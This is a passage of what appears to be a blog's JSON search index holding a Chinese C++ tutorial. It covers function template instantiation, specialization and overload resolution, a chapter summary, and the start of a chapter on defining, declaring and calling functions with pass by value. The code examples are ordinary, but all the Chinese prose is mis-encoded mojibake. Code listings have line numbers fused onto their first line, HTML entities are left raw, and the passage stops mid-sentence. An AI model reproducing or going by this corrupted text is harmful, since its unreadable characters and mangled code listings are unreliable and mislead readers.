Swap&lt;Job&gt;ï¼Œäºæ˜¯ä¼˜å…ˆé€‰æ‹©å¹¶è°ƒç”¨è¿™ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é€šç”¨çš„æ¨¡æ¿ç‰ˆæœ¬ã€‚ 8.5.4 å®ä¾‹åŒ–å’Œå…·ä½“åŒ– (Instantiation and Specialization)åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå¾ˆé‡è¦ï¼š å®ä¾‹åŒ– (Instantiation): ç¼–è¯‘å™¨æ ¹æ®å‡½æ•°æ¨¡æ¿å’Œè°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç‰¹å®šç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ã€‚è¿™æ˜¯æ¨¡æ¿çš„åŸºæœ¬å·¥ä½œæ–¹å¼ã€‚ éšå¼å®ä¾‹åŒ– (Implicit Instantiation): ç¼–è¯‘å™¨åœ¨éœ€è¦æ—¶è‡ªåŠ¨è¿›è¡Œï¼ˆå¦‚ Swap(i, j)ï¼‰ã€‚ æ˜¾å¼å®ä¾‹åŒ– (Explicit Instantiation): ç¨‹åºå‘˜å¯ä»¥æŒ‡ç¤ºç¼–è¯‘å™¨ç«‹å³ç”Ÿæˆç‰¹å®šç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ï¼Œå³ä½¿è¿˜æ²¡æœ‰è°ƒç”¨å®ƒã€‚è¯­æ³•ï¼štemplate return_type function_name&lt;specific_type&gt;(parameter_list); (æ³¨æ„æœ«å°¾çš„åˆ†å·)ã€‚è¿™åœ¨æŸäº›é«˜çº§åœºæ™¯ï¼ˆå¦‚å°†æ¨¡æ¿å®šä¹‰æ”¾åœ¨æºæ–‡ä»¶ä¸­ï¼‰å¯èƒ½æœ‰ç”¨ã€‚ 12// åœ¨ .cpp æ–‡ä»¶ä¸­æ˜¾å¼å®ä¾‹åŒ– Swap&lt;int&gt;template void Swap&lt;int&gt;(int&amp;, int&amp;); å…·ä½“åŒ– (Specialization): ç¨‹åºå‘˜ä¸ºæŸä¸ªç‰¹å®šç±»å‹æä¾›ä¸€ä¸ªå®Œå…¨ä¸åŒçš„ã€éæ¨¡æ¿çš„å‡½æ•°å®šä¹‰ï¼Œä»¥è¦†ç›–é€šç”¨çš„æ¨¡æ¿è¡Œä¸ºã€‚ æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization): ä½¿ç”¨ template &lt;&gt; è¯­æ³•ä¸ºç‰¹å®šç±»å‹æä¾›è‡ªå®šä¹‰å®ç°ï¼ˆå¦‚ä¸Šä¾‹ä¸­çš„ Swap&lt;Job&gt;ï¼‰ã€‚ 8.5.5 ç¼–è¯‘å™¨é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬å½“å­˜åœ¨å¤šä¸ªå‡½æ•°ï¼ˆæ™®é€šå‡½æ•°ã€å‡½æ•°æ¨¡æ¿ã€æ¨¡æ¿å…·ä½“åŒ–ï¼‰å¯èƒ½åŒ¹é…ä¸€ä¸ªå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¼–è¯‘å™¨éµå¾ªä¸€å¥—è§„åˆ™æ¥é€‰æ‹©æœ€ä½³åŒ¹é…ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**é‡è½½è§£æ (Overload Resolution)**ã€‚ç®€åŒ–è§„åˆ™å¦‚ä¸‹ï¼š å¯»æ‰¾å®Œå…¨åŒ¹é…: ç¼–è¯‘å™¨é¦–å…ˆæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªéæ¨¡æ¿å‡½æ•°ï¼Œå…¶å‚æ•°ç±»å‹ä¸è°ƒç”¨å®å‚å®Œå…¨åŒ¹é…ï¼ˆæˆ–åªéœ€è¿›è¡Œä¸é‡è¦çš„è½¬æ¢ï¼Œå¦‚æ•°ç»„ååˆ°æŒ‡é’ˆï¼‰ã€‚ å¯»æ‰¾æ¨¡æ¿åŒ¹é…: å¦‚æœæ²¡æœ‰æ‰¾åˆ°å®Œå…¨åŒ¹é…çš„éæ¨¡æ¿å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æŸ¥æ‰¾å‡½æ•°æ¨¡æ¿ã€‚ æŸ¥æ‰¾æ˜¾å¼å…·ä½“åŒ–: æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ï¼Œå…¶ç±»å‹ä¸å®å‚å®Œå…¨åŒ¹é…ã€‚ å°è¯•æ¨¡æ¿å®ä¾‹åŒ–: å°è¯•é€šè¿‡å®å‚æ¨å¯¼æ¨¡æ¿å‚æ•°ï¼Œçœ‹æ˜¯å¦èƒ½ä»é€šç”¨æ¨¡æ¿ç”Ÿæˆä¸€ä¸ªåŒ¹é…çš„å®ä¾‹ã€‚ é€‰æ‹©æœ€ä½³åŒ¹é…: å¦‚æœåªæœ‰ä¸€ä¸ªåŒ¹é…é¡¹ï¼ˆéæ¨¡æ¿å‡½æ•°ã€æ˜¾å¼å…·ä½“åŒ–æˆ–æ¨¡æ¿å®ä¾‹ï¼‰ï¼Œåˆ™é€‰æ‹©è¯¥é¡¹ã€‚ å¦‚æœå­˜åœ¨å¤šä¸ªåŒ¹é…é¡¹ï¼š éæ¨¡æ¿å‡½æ•°ä¼˜å…ˆäºæ¨¡æ¿å®ä¾‹: å¦‚æœä¸€ä¸ªéæ¨¡æ¿å‡½æ•°å’Œä¸€ä¸ªæ¨¡æ¿å®ä¾‹éƒ½èƒ½åŒ¹é…ï¼Œé€šå¸¸ä¼˜å…ˆé€‰æ‹©éæ¨¡æ¿å‡½æ•°ã€‚ æ˜¾å¼å…·ä½“åŒ–ä¼˜å…ˆäºæ¨¡æ¿å®ä¾‹: å¦‚æœä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–å’Œä¸€ä¸ªé€šç”¨æ¨¡æ¿å®ä¾‹éƒ½èƒ½åŒ¹é…ï¼Œä¼˜å…ˆé€‰æ‹©æ˜¾å¼å…·ä½“åŒ–ã€‚ æ›´å…·ä½“çš„æ¨¡æ¿ä¼˜å…ˆ: å¦‚æœæœ‰å¤šä¸ªæ¨¡æ¿å®ä¾‹å¯ä»¥åŒ¹é…ï¼ˆå¯èƒ½æ¶‰åŠç±»å‹è½¬æ¢ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æ‰¾å‡ºâ€œæœ€å…·ä½“â€çš„æ¨¡æ¿ï¼ˆå³éœ€è¦è¾ƒå°‘æˆ–è¾ƒä¸å¤æ‚çš„ç±»å‹è½¬æ¢å°±èƒ½åŒ¹é…çš„æ¨¡æ¿ï¼‰ã€‚å¦‚æœæ— æ³•ç¡®å®šå“ªä¸ªæœ€å…·ä½“ï¼Œåˆ™è°ƒç”¨æ˜¯**æ­§ä¹‰çš„ (ambiguous)**ï¼Œä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;// 1. éæ¨¡æ¿å‡½æ•°void Show(int i) &#123; std::cout &lt;&lt; &quot;Non-template Show(int): &quot; &lt;&lt; i &lt;&lt; std::endl; &#125;// 2. é€šç”¨å‡½æ•°æ¨¡æ¿template &lt;typename T&gt;void Show(T t) &#123; std::cout &lt;&lt; &quot;Template Show(T): &quot; &lt;&lt; t &lt;&lt; std::endl; &#125;// 3. æ˜¾å¼å…·ä½“åŒ–template &lt;&gt;void Show&lt;double&gt;(double d) &#123; std::cout &lt;&lt; &quot;Specialized Show&lt;double&gt;: &quot; &lt;&lt; d &lt;&lt; std::endl; &#125;int main() &#123; int a = 10; double b = 3.14; char c = &#x27;X&#x27;; Show(a); // ä¼˜å…ˆåŒ¹é… 1 (éæ¨¡æ¿å‡½æ•°) Show(b); // ä¼˜å…ˆåŒ¹é… 3 (æ˜¾å¼å…·ä½“åŒ–) Show(c); // åŒ¹é… 2 (é€šç”¨æ¨¡æ¿å®ä¾‹åŒ– Show&lt;char&gt;) Show&lt;&gt;(a); // ä½¿ç”¨ &lt;&gt; å¼ºåˆ¶ç¼–è¯‘å™¨åªè€ƒè™‘æ¨¡æ¿ç‰ˆæœ¬ï¼ŒåŒ¹é… 2 (é€šç”¨æ¨¡æ¿å®ä¾‹åŒ– Show&lt;int&gt;) return 0;&#125; 8.5.6 æ¨¡æ¿å‡½æ•°çš„å‘å±•å‡½æ•°æ¨¡æ¿æ˜¯ C++ æ³›å‹ç¼–ç¨‹çš„åŸºç¡€ã€‚è‡ª C++11 ä»¥æ¥ï¼Œæ¨¡æ¿åŠŸèƒ½å¾—åˆ°äº†è¿›ä¸€æ­¥å¢å¼ºï¼š auto è¿”å›ç±»å‹æ¨å¯¼: å…è®¸ç¼–è¯‘å™¨æ ¹æ® return è¯­å¥æ¨å¯¼å‡½æ•°æ¨¡æ¿çš„è¿”å›ç±»å‹ã€‚ å¯å˜å‚æ•°æ¨¡æ¿ (Variadic Templates): å…è®¸å®šä¹‰æ¥å—ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹å‚æ•°çš„æ¨¡æ¿ï¼ˆè§ 18.6 èŠ‚ï¼‰ã€‚ åˆ«åæ¨¡æ¿ (using): å¯ä»¥ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«åã€‚ Lambda è¡¨è¾¾å¼: å¯ä»¥åˆ›å»ºåŒ¿åçš„å‡½æ•°å¯¹è±¡ï¼Œå¸¸ä¸æ¨¡æ¿ç®—æ³•ç»“åˆä½¿ç”¨ã€‚ Concepts (C++20): å…è®¸å¯¹æ¨¡æ¿å‚æ•°æ–½åŠ æ›´æ˜ç¡®çš„çº¦æŸï¼Œæé«˜äº†ç¼–è¯‘æ—¶é”™è¯¯ä¿¡æ¯çš„å¯è¯»æ€§ï¼Œå¹¶ä½¿æ¨¡æ¿æ„å›¾æ›´æ¸…æ™°ã€‚ å‡½æ•°æ¨¡æ¿æ˜¯ C++ ä¸­ä¸€ä¸ªéå¸¸å¼ºå¤§å’Œçµæ´»çš„ç‰¹æ€§ï¼Œå®ƒä½¿å¾—ç¼–å†™é«˜åº¦é€šç”¨å’Œå¯é‡ç”¨çš„ä»£ç æˆä¸ºå¯èƒ½ã€‚ 8.6 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº† C++ å‡½æ•°çš„æ›´å¤šé«˜çº§ç‰¹æ€§ï¼Œæ—¨åœ¨æé«˜ä»£ç çš„æ•ˆç‡ã€çµæ´»æ€§å’Œå¯é‡ç”¨æ€§ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š å†…è”å‡½æ•° (inline): ä¸€ç§ä¼˜åŒ–å»ºè®®ï¼Œè¯·æ±‚ç¼–è¯‘å™¨å°†å‡½æ•°ä»£ç ç›´æ¥æ›¿æ¢åˆ°è°ƒç”¨ç‚¹ï¼Œä»¥å‡å°‘å°å‹ã€é¢‘ç¹è°ƒç”¨å‡½æ•°çš„è°ƒç”¨å¼€é”€ã€‚ inline åªæ˜¯å»ºè®®ï¼Œç¼–è¯‘å™¨å¯è‡ªè¡Œå†³å®šæ˜¯å¦é‡‡çº³ã€‚ é€šå¸¸å°†å†…è”å‡½æ•°å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ ç›¸æ¯”å®ï¼Œå†…è”å‡½æ•°å…·æœ‰ç±»å‹å®‰å…¨ã€è¡Œä¸ºå¯é¢„æµ‹ç­‰ä¼˜ç‚¹ã€‚ å¼•ç”¨å˜é‡ (&amp;): å˜é‡çš„åˆ«åï¼Œå£°æ˜æ—¶å¿…é¡»åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½å†å¼•ç”¨å…¶ä»–å˜é‡ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ (type&amp;)ï¼šå‡½æ•°å‚æ•°æˆä¸ºåŸå§‹å®å‚çš„åˆ«åï¼Œå…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹æ•°æ®ï¼Œä¸”é¿å…äº†å¤§å‹å¯¹è±¡çš„å¤åˆ¶å¼€é”€ã€‚ æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (const type&amp;)ï¼šå‡½æ•°å‚æ•°æˆä¸ºåŸå§‹å®å‚çš„å¸¸é‡åˆ«åï¼Œä¸èƒ½é€šè¿‡å¼•ç”¨ä¿®æ”¹åŸå§‹æ•°æ®ï¼Œä½†åŒæ ·é¿å…äº†å¤åˆ¶å¼€é”€ã€‚è¿™æ˜¯ä¼ é€’å¤§å‹å¯¹è±¡è¿›è¡Œåªè¯»è®¿é—®çš„æ¨èæ–¹å¼ã€‚ å¼•ç”¨æ¯”æŒ‡é’ˆåœ¨è¯­æ³•ä¸Šæ›´ç®€æ´ï¼Œä¸”é€šå¸¸ä¸æ¶‰åŠç©ºå€¼é—®é¢˜ã€‚ é»˜è®¤å‚æ•°: å…è®¸åœ¨å‡½æ•°å£°æ˜ï¼ˆåŸå‹ï¼‰ä¸­ä¸ºå‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚ è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœçœç•¥äº†å¸¦æœ‰é»˜è®¤å€¼çš„å‚æ•°ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ã€‚ é»˜è®¤å‚æ•°å¿…é¡»ä»å‚æ•°åˆ—è¡¨çš„æœ€å³è¾¹å¼€å§‹æŒ‡å®šã€‚ ç®€åŒ–äº†å‡½æ•°è°ƒç”¨ï¼Œæé«˜äº†å‡½æ•°çš„çµæ´»æ€§ã€‚ å‡½æ•°é‡è½½: å…è®¸åœ¨åŒä¸€ä½œç”¨åŸŸå†…å®šä¹‰å¤šä¸ªåŒåå‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨ï¼ˆæ•°é‡ã€ç±»å‹ã€é¡ºåºï¼‰ä¸åŒã€‚ ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶çš„å®å‚æ¥é€‰æ‹©åŒ¹é…çš„é‡è½½ç‰ˆæœ¬ã€‚ è¿”å›ç±»å‹ä¸èƒ½ä½œä¸ºåŒºåˆ†é‡è½½å‡½æ•°çš„ä¾æ®ã€‚ é€‚ç”¨äºæ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼ä½†å¤„ç†ä¸åŒå‚æ•°çš„ä»»åŠ¡ã€‚ å‡½æ•°æ¨¡æ¿ (template &lt;typename T&gt;): åˆ›å»ºé€šç”¨çš„ã€ä¸ç±»å‹æ— å…³çš„å‡½æ•°å®šä¹‰ã€‚ ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹å®ä¾‹åŒ–ç›¸åº”çš„å‡½æ•°ç‰ˆæœ¬ã€‚ é‡è½½æ¨¡æ¿: å¯ä»¥å®šä¹‰å¤šä¸ªåŒåæ¨¡æ¿ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨æˆ–æ¨¡æ¿å‚æ•°åˆ—è¡¨ä¸åŒã€‚ æ˜¾å¼å…·ä½“åŒ– (template &lt;&gt;): ä¸ºç‰¹å®šç±»å‹æä¾›ä¸“é—¨çš„ã€éæ¨¡æ¿çš„å®ç°ï¼Œä»¥è¦†ç›–é€šç”¨æ¨¡æ¿çš„è¡Œä¸ºã€‚ æ¨¡æ¿æ˜¯ C++ æ³›å‹ç¼–ç¨‹çš„åŸºç¡€ï¼Œæå¤§åœ°æé«˜äº†ä»£ç çš„å¯é‡ç”¨æ€§ã€‚ é€šè¿‡æŒæ¡è¿™äº›é«˜çº§å‡½æ•°ç‰¹æ€§ï¼Œå¯ä»¥ç¼–å†™å‡ºæ›´é«˜æ•ˆã€æ›´çµæ´»ã€æ›´æ˜“äºç»´æŠ¤çš„ C++ ä»£ç ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 7 å‡½æ•°â€”â€”C++çš„ç¼–ç¨‹æ¨¡å—","slug":"Cpp_tutorial_Chapter_7","date":"2025-04-26T12:03:35.384Z","updated":"2025-04-26T12:01:58.783Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_7/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_7/","excerpt":"","text":"7.1 å¤ä¹ å‡½æ•°çš„åŸºæœ¬çŸ¥è¯†å‡½æ•°æ˜¯ C++ ç¨‹åºçš„åŸºæœ¬æ„å»ºå—ï¼Œå®ƒä»¬å…è®¸æˆ‘ä»¬å°†ä»£ç ç»„ç»‡æˆå¯é‡ç”¨çš„ã€é€»è¾‘ç‹¬ç«‹çš„å•å…ƒã€‚ä½¿ç”¨å‡½æ•°å¯ä»¥ä½¿ç¨‹åºæ›´æ¨¡å—åŒ–ã€æ›´æ˜“äºç†è§£å’Œç»´æŠ¤ã€‚æœ¬èŠ‚å°†å¤ä¹ å‡½æ•°çš„åŸºæœ¬æ¦‚å¿µï¼šå®šä¹‰ã€åŸå‹å’Œè°ƒç”¨ã€‚ 7.1.1 å®šä¹‰å‡½æ•°å‡½æ•°å®šä¹‰ (Function Definition) åŒ…å«äº†å‡½æ•°çš„å®é™…ä»£ç ï¼Œå®ƒè¯´æ˜äº†å‡½æ•°åšä»€ä¹ˆä»¥åŠå¦‚ä½•åšã€‚ä¸€ä¸ªå‡½æ•°å®šä¹‰åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š è¿”å›ç±»å‹ (Return Type): å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¿”å›ç»™è°ƒç”¨è€…çš„å€¼çš„ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ï¼Œåˆ™è¿”å›ç±»å‹ä¸º voidã€‚ å‡½æ•°å (Function Name): ç”¨äºè°ƒç”¨å‡½æ•°çš„æ ‡è¯†ç¬¦ã€‚å‘½åè§„åˆ™ä¸å˜é‡åç›¸åŒã€‚ å‚æ•°åˆ—è¡¨ (Parameter List): ä½äºå‡½æ•°ååçš„åœ†æ‹¬å· () ä¸­ï¼Œç”¨äºæ¥æ”¶ä¼ é€’ç»™å‡½æ•°çš„å€¼ã€‚å‚æ•°ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œæ¯ä¸ªå‚æ•°éƒ½éœ€è¦æŒ‡å®šç±»å‹å’Œåç§°ã€‚å¦‚æœå‡½æ•°ä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œæ‹¬å·å†…å¯ä»¥ä¸ºç©ºæˆ–å†™ voidã€‚ å‡½æ•°ä½“ (Function Body): ä½äºèŠ±æ‹¬å· &#123;&#125; ä¸­ï¼ŒåŒ…å«å®ç°å‡½æ•°åŠŸèƒ½çš„ C++ è¯­å¥ã€‚ è¯­æ³•: 12345return_type function_name(parameter_list) &#123; // å‡½æ•°ä½“ï¼šåŒ…å«æ‰§è¡Œä»»åŠ¡çš„è¯­å¥ // å¦‚æœ return_type ä¸æ˜¯ voidï¼Œåˆ™éœ€è¦ return è¯­å¥è¿”å›å€¼ return value; // (å¦‚æœ return_type ä¸æ˜¯ void)&#125; ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªç®€å•çš„å‡½æ•° è¿™ä¸ªå‡½æ•°ä¸æ¥å—å‚æ•°ï¼Œä¹Ÿä¸è¿”å›å€¼ (void)ï¼Œåªæ˜¯æ‰“å°ä¸€æ¡æ¶ˆæ¯ã€‚ 123456789101112#include &lt;iostream&gt;// å‡½æ•°å®šä¹‰void print_greeting() &#123; std::cout &lt;&lt; &quot;Hello from the function!&quot; &lt;&lt; std::endl;&#125;int main() &#123; // è°ƒç”¨å‡½æ•° print_greeting(); return 0;&#125; ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªå¸¦å‚æ•°å¹¶è¿”å›å€¼çš„å‡½æ•° è¿™ä¸ªå‡½æ•°æ¥å—ä¸¤ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„å’Œã€‚ 12345678910111213141516#include &lt;iostream&gt;// å‡½æ•°å®šä¹‰int add_numbers(int num1, int num2) &#123; int sum = num1 + num2; return sum; // è¿”å›è®¡ç®—ç»“æœ&#125;int main() &#123; int a = 5; int b = 3; // è°ƒç”¨å‡½æ•°å¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨ result å˜é‡ä¸­ int result = add_numbers(a, b); std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; result &lt;&lt; std::endl; // è¾“å‡º: The sum of 5 and 3 is: 8 return 0;&#125; 7.1.2 å‡½æ•°åŸå‹å’Œå‡½æ•°è°ƒç”¨å‡½æ•°åŸå‹ (Function Prototype) ä¹Ÿç§°ä¸ºå‡½æ•°å£°æ˜ (Function Declaration)ï¼Œå®ƒå‘Šè¯‰ç¼–è¯‘å™¨å‡½æ•°çš„åç§°ã€è¿”å›ç±»å‹ä»¥åŠå‚æ•°åˆ—è¡¨ï¼ˆç±»å‹å’Œé¡ºåºï¼‰ï¼Œä½†ä¸åŒ…å«å‡½æ•°ä½“ã€‚åŸå‹é€šå¸¸æ”¾åœ¨ main() å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚ ä¸ºä»€ä¹ˆéœ€è¦åŸå‹ï¼Ÿ C++ ç¼–è¯‘å™¨åœ¨å¤„ç†ä»£ç æ—¶éœ€è¦â€œé¢„å…ˆçŸ¥é“â€å‡½æ•°çš„æ¥å£ï¼ˆå®ƒæ¥å—ä»€ä¹ˆå‚æ•°ï¼Œè¿”å›ä»€ä¹ˆç±»å‹ï¼‰ï¼Œç„¶åæ‰èƒ½æ­£ç¡®åœ°å¤„ç†å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨ã€‚å¦‚æœå‡½æ•°å®šä¹‰å‡ºç°åœ¨è°ƒç”¨å®ƒçš„ä»£ç ä¹‹åï¼Œç¼–è¯‘å™¨åœ¨é‡åˆ°è°ƒç”¨æ—¶å°±ä¸çŸ¥é“è¯¥å‡½æ•°æ˜¯å¦å­˜åœ¨æˆ–å¦‚ä½•è°ƒç”¨å®ƒï¼Œä»è€Œå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚å‡½æ•°åŸå‹è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ è¯­æ³•: 1return_type function_name(parameter_type_list); // æ³¨æ„æœ«å°¾çš„åˆ†å· å‚æ•°åç§°åœ¨åŸå‹ä¸­æ˜¯å¯é€‰çš„ï¼Œä½†å†™ä¸Šé€šå¸¸èƒ½æé«˜å¯è¯»æ€§ã€‚ å‡½æ•°è°ƒç”¨ (Function Call) æ˜¯æŒ‡åœ¨ç¨‹åºä¸­æ‰§è¡Œä¸€ä¸ªå‡½æ•°ã€‚é€šè¿‡ä½¿ç”¨å‡½æ•°åï¼Œå¹¶åœ¨æ‹¬å·ä¸­æä¾›æ‰€éœ€çš„å®é™…å‚æ•°ï¼ˆç§°ä¸º**å®å‚ (Arguments)**ï¼‰æ¥å®Œæˆè°ƒç”¨ã€‚ è¯­æ³•: 1234567// å¯¹äºä¸è¿”å›å€¼çš„å‡½æ•°function_name(argument_list);// å¯¹äºè¿”å›å€¼çš„å‡½æ•°variable = function_name(argument_list);// æˆ–è€…ç›´æ¥åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨// std::cout &lt;&lt; function_name(argument_list); ç¤ºä¾‹ï¼šä½¿ç”¨å‡½æ•°åŸå‹ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// å‡½æ•°åŸå‹ (å£°æ˜)void display_message(const char* msg); // å£°æ˜å‡½æ•°æ¥å£int multiply(int x, int y); // å£°æ˜å‡½æ•°æ¥å£int main() &#123; // å‡½æ•°è°ƒç”¨ display_message(&quot;This is a message.&quot;); int num1 = 6; int num2 = 7; int product = multiply(num1, num2); // è°ƒç”¨å‡½æ•° std::cout &lt;&lt; &quot;The product of &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot; is: &quot; &lt;&lt; product &lt;&lt; std::endl; // è¾“å‡º: 42 return 0;&#125;// å‡½æ•°å®šä¹‰ (å®ç°) - å¯ä»¥æ”¾åœ¨ main ä¹‹åï¼Œå› ä¸ºåŸå‹å·²ç»æä¾›äº†ä¿¡æ¯void display_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl;&#125;// å‡½æ•°å®šä¹‰ (å®ç°)int multiply(int x, int y) &#123; return x * y;&#125; æ€»ç»“: å‡½æ•°å®šä¹‰: æä¾›äº†å‡½æ•°çš„å®Œæ•´å®ç°ï¼ˆä»£ç ï¼‰ã€‚ å‡½æ•°åŸå‹: å£°æ˜äº†å‡½æ•°çš„æ¥å£ï¼ˆåç§°ã€è¿”å›ç±»å‹ã€å‚æ•°ç±»å‹ï¼‰ï¼Œè®©ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•è°ƒç”¨å®ƒï¼Œé€šå¸¸æ”¾åœ¨è°ƒç”¨ä¹‹å‰ã€‚ å‡½æ•°è°ƒç”¨: é€šè¿‡å‡½æ•°åå’Œå®å‚æ¥æ‰§è¡Œå‡½æ•°å®šä¹‰çš„ä»£ç ã€‚ å‡½æ•°æ˜¯æ„å»ºç»“æ„åŒ–å’Œå¯ç»´æŠ¤ C++ ç¨‹åºçš„æ ¸å¿ƒå·¥å…·ã€‚ 7.2 å‡½æ•°å‚æ•°å’ŒæŒ‰å€¼ä¼ é€’å‡½æ•°å‚æ•°æ˜¯å‡½æ•°ä¸è°ƒç”¨å®ƒçš„ä»£ç ä¹‹é—´ä¼ é€’ä¿¡æ¯çš„æ¡¥æ¢ã€‚å½“è°ƒç”¨å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æä¾›çš„å€¼ï¼ˆå®å‚ï¼‰ä¼šè¢«ä¼ é€’ç»™å‡½æ•°å®šä¹‰ä¸­å£°æ˜çš„å˜é‡ï¼ˆå½¢å‚ï¼‰ã€‚C++ é»˜è®¤çš„å‚æ•°ä¼ é€’æ–¹å¼æ˜¯**æŒ‰å€¼ä¼ é€’ (Pass by Value)**ã€‚ å½¢å‚ (Parameters): åœ¨å‡½æ•°å®šä¹‰æˆ–å‡½æ•°åŸå‹ä¸­å£°æ˜çš„å˜é‡ï¼Œå®ƒä»¬æ˜¯å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„å±€éƒ¨å˜é‡ï¼Œç”¨äºæ¥æ”¶è°ƒç”¨æ—¶ä¼ å…¥çš„å€¼ã€‚ å®å‚ (Arguments): åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ é€’ç»™å‡½æ•°çš„å…·ä½“å€¼æˆ–å˜é‡ã€‚ æŒ‰å€¼ä¼ é€’ (Pass by Value): å½“ä½¿ç”¨æŒ‰å€¼ä¼ é€’æ—¶ï¼Œå‡½æ•°ä¼šåˆ›å»ºæ¯ä¸ªå½¢å‚çš„å‰¯æœ¬ã€‚è°ƒç”¨å‡½æ•°æ—¶æä¾›çš„å®å‚çš„å€¼ä¼šè¢«å¤åˆ¶åˆ°è¿™äº›æ–°çš„å½¢å‚å˜é‡ä¸­ã€‚å‡½æ•°å†…éƒ¨å¯¹å½¢å‚æ‰€åšçš„ä»»ä½•ä¿®æ”¹éƒ½åªå½±å“è¿™ä¸ªå‰¯æœ¬ï¼Œä¸ä¼šå½±å“åˆ°å‡½æ•°è°ƒç”¨ä¸­ä½¿ç”¨çš„åŸå§‹å®å‚ã€‚ ç¤ºä¾‹ï¼šæ¼”ç¤ºæŒ‰å€¼ä¼ é€’ 12345678910111213141516171819202122#include &lt;iostream&gt;// å‡½æ•°å®šä¹‰ï¼šæ¥å—ä¸€ä¸ª int å‚æ•° (å½¢å‚ n)// æŒ‰å€¼ä¼ é€’ï¼Œn æ˜¯ value çš„å‰¯æœ¬void modify_value(int n) &#123; std::cout &lt;&lt; &quot;Inside function (before modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl; n = n * 2; // ä¿®æ”¹å½¢å‚ n çš„å€¼ std::cout &lt;&lt; &quot;Inside function (after modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; int value = 10; // å®å‚ std::cout &lt;&lt; &quot;Before calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // è°ƒç”¨å‡½æ•°ï¼Œå°† value çš„å€¼ä¼ é€’ç»™å½¢å‚ n modify_value(value); std::cout &lt;&lt; &quot;After calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // value çš„å€¼å¹¶æœªæ”¹å˜ return 0;&#125; è¾“å‡º: 1234Before calling function: value &#x3D; 10Inside function (before modification): n &#x3D; 10Inside function (after modification): n &#x3D; 20After calling function: value &#x3D; 10 ä»£ç è§£é‡Š: main å‡½æ•°ä¸­çš„å˜é‡ value åˆå§‹åŒ–ä¸º 10ã€‚ è°ƒç”¨ modify_value(value) æ—¶ï¼Œvalue çš„å€¼ (10) è¢«å¤åˆ¶ç»™äº† modify_value å‡½æ•°çš„å½¢å‚ nã€‚ åœ¨ modify_value å‡½æ•°å†…éƒ¨ï¼Œn çš„å€¼è¢«ä¿®æ”¹ä¸º 